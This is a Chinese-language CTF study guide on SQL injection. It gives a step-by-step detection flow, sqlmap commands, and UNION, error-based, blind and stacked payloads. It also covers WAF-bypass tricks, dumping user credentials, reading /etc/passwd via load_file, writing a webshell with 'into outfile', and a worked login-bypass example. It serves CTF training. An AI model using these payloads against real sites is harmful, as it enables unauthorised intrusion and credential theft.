# SQL 注入

关键词：SQL注入 SQLi sqli injection 注入 盲注 报错注入 联合注入 堆叠注入 二次注入 WAF绕过 万能密码

## ① 识别指纹

- 题干里出现**登录框、搜索框、列表筛选、`?id=1`、`?user=admin`** 这类可点的参数
- 附件是 PHP / Java / Python 源码，能看到 SQL 拼接字符串
- 报错页面出现 `You have an error in your SQL syntax`、`ORA-`、`SQLSTATE`、`Microsoft OLE DB`
- 题目名字里带 **Easy / Baby / Login / Admin / SQL** 的组合
- 登录题给了账号密码提示但登录不上 —— 十有八九是万能密码

## ② 考什么

- 字符型 / 数字型注入点的判定
- 联合查询 `UNION`（列数对齐、回显位）
- 报错注入 `extractvalue` / `updatexml` / `floor(rand()*2)` / 几何函数
- 布尔盲注、时间盲注
- 堆叠注入（`;` 分隔，MySQL 需 `multi_query`）
- 二次注入（存进去再取出来）
- WAF / 关键字过滤绕过（双写、大小写、注释、编码、`/**/`）
- 文件读写：`into outfile`、`load_file`
- 无列名注入（`union select 1,(select group_concat(x) from (select 1 as x)a)`）
- 不同数据库方言：MySQL / PostgreSQL / SQLite / MSSQL / Oracle

## ③ 判断流程

> 从最便宜的探测开始。命中的那一步通常就是整题的解法。

1. **找到所有可控参数**：URL 参数、POST 表单、Cookie、HTTP 头 —— 列出清单，逐个人工试；命中，进 2
2. **打一个 `'`**：页面报错 / 返回 500 / 内容变化 → 有注入；**毫无变化不代表没有**，跳 3
3. **数字型判定**：`id=1 and 1=1` 与 `id=1 and 1=2` 结果不同 → 数字型；相同 → 跳 4
4. **字符型判定**：`id=1' and '1'='1` 与 `id=1' and '1'='2` 结果不同 → 字符型，记下闭合方式（`'`、`"`、`')`、`'))`）
5. **测注释符**：`-- `、`#`、`--+`、`/**/` 哪个生效 —— 决定后面所有 payload 的结尾
6. **测回显**：`order by N` 递增找到列数；`union select 1,2,3...` 看哪几个位置被页面渲染出来
   - 有回显位置 → **走联合注入，直接读库**，跳 12
   - 无回显但有报错 → 跳 7
   - 无回显无报错 → 跳 8
7. **报错注入**：`and extractvalue(1,concat(0x7e,(select database())))`，能把数据挤进报错信息 → 直接读库，跳 12
8. **布尔盲注**：`and length(database())>5`、`and ascii(substr(database(),1,1))>100`，用页面差异做二分 → 能读但慢
9. **时间盲注**：`and sleep(3)`、`and if(1=1,sleep(3),0)` —— 页面完全无差异时用，配合 `substr` 逐字符
10. **测堆叠**：`1;select 1` —— 成功则可直接 `;select ... into outfile` 写马，或 `;update` 改数据
11. **测读写权限**：`and load_file('/etc/passwd')`；`union select ... into outfile '/var/www/html/x.php'`
12. **过滤拦截了？**：双写（`seselectlect`）、大小写、`/**/` 代替空格、URL/十六进制编码、`union select` 换成 `union all select`、关键字换成等价函数 → 回到 2 重试
13. **以上全不成立**：回到 1，把 Cookie、`User-Agent`、`X-Forwarded-For`、`Referer` 也纳入参数清单（很多题只在 header 里注入）

## ④ 工具与命令

```bash
# 全自动（先手工确认，再用它省时间）
sqlmap -u "http://t.cn/a.php?id=1" --batch --dbs
sqlmap -u "http://t.cn/a.php?id=1" -D db -T users --dump
sqlmap -r req.txt --batch --level 5 --risk 3    # POST 请求，从 Burp 存下来

# 联合注入列数探测
?id=1 order by 1
?id=1 order by 5
?id=-1 union select 1,2,3,4
```

```sql
-- 常用读取顺序
select database();                              -- 当前库
select group_concat(schema_name) from information_schema.schemata;
select group_concat(table_name) from information_schema.tables where table_schema=database();
select group_concat(column_name) from information_schema.columns where table_name='users';
select group_concat(username,0x3a,password) from users;

-- 报错注入
and extractvalue(1,concat(0x7e,(select database()),0x7e))
and updatexml(1,concat(0x7e,(select database())),1)

-- 时间盲注
and if(substr(database(),1,1)='s',sleep(3),0)
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| `'` 不报错，以为没注入 | 那是数字型，参数直接拼进 SQL 没引号 | 试 `and 1=1` / `and 1=2` |
| `union select` 一直失败 | 前半句有结果集占据了回显位 | 把 `id=1` 改成 `id=-1` 让前半句返回空 |
| 报错被 `error_reporting(0)` 关掉 | 无回显 | 转布尔盲注或时间盲注 |
| `information_schema` 被 WAF 拦 | 关键字黑名单 | 无列名注入、`mysql.innodb_table_stats`、`sys` 库 |
| `into outfile` 失败 | MySQL `secure_file_priv` 非空，或没有写权限 | 改 `load_file` 读，或换堆叠 |
| 明明登录成功了却没 flag | 登录点是幌子 | 登录后去看新出现的页面/接口，flag 往往在下一层 |
| `--` 后面少了空格 | MySQL 要求 `-- ` 带空格 | 用 `#` 或 `-- -` 或 `--+` |

## ⑥ 例题

**题目**：`[极客大挑战 2019] EasySQL`
**来源**：BUUCTF 复现平台（原题出自 2019 极客大挑战）
**题干**：一个登录页面，用户名、密码两个输入框，没有任何其他信息。

**关键观察**：页面没有任何过滤提示，但正常登录报"用户名或密码错误"——说明参数进了 SQL，且错误信息被统一处理了。这是典型的**万能密码**起手。

**走了哪条链**：判断流程第 1 条（找到可控参数：username）→ 第 2 条（打 `'` 后登录行为改变）→ 判定为字符型 → 直接用恒真条件绕过。

**命令与输出**：

```text
用户名：1' or '1'='1 #
密码：  任意

→ 页面跳转，直接返回 flag
```

或者更短的：

```text
用户名：admin' #
密码：  任意
```

原理是密码校验那一段被 `#` 注释掉了，查询变成"用户名 = admin"，恒成立。

**为什么平时不用 `#`**：`#` 在 HTTP 请求里会被当成 fragment，所以只有直接输入到表单（浏览器会编码）时才稳妥；在 URL 里要用 `%23`。

---

**再给一个盲注的练手方向**：`[极客大挑战 2019] BabySQL` 对 `select`、`union`、`or`、`and` 做了黑名单，需要双写（`ununionion seselectlect`）或 `/**/` 拆解。识别特征和判断流程完全一样，只是第 12 条（过滤绕过）成为主战场。

::: tip flag 说明
本页例题的 flag 随平台和原题版本变化，不在页内固定。练习目标是**走通判断流程**，不是背 flag。
:::
